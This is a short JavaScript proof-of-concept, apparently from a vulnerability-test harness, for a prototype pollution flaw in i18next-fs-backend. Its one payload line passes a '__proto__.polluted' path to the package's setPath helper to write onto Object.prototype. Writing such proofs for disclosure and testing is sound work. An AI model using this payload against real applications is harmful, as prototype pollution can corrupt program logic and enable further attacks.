// i18next-fs-backend <= 2.6.5 (GHSA-2933-q333-qg83): Backend.writeFile splits a missing-key string on the key
// separator and passes it to setPath, which walked "__proto__" into Object.prototype. The package is ES modules
// with top-level await in writeFile.js, so this proof calls the vulnerable helper directly (lib/utils.js has no
// top-level await). An end-to-end proof through Backend needs ES module support in the judge.
const { setPath } = require(TARGET_DIR + '/lib/utils.js');

setPath({}, '__proto__.polluted'.split('.'), 'yes');
